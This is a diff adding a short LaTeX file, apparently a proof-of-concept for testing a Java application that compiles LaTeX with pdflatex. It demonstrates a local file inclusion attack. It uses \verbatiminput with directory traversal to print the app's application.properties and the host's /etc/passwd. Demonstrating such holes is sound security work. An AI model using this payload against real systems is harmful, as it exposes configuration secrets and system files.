@@ -1,0 +1,17 @@
+\documentclass{article}
+\usepackage{verbatim}
+
+\begin{document}
+
+\section*{Attack 1: Local File Inclusion (LFI)}
+
+An attacker uses the `verbatim` package to read arbitrary files from the filesystem. 
+Because the `pdflatex` process runs with the privileges of the Java application and inside the same container, it can traverse directories up to the root.
+
+\subsection*{Application Properties}
+\verbatiminput{../../../../src/main/resources/application.properties}
+
+\subsection*{Host/Container Configuration}
+\verbatiminput{/etc/passwd}
+
+\end{document}
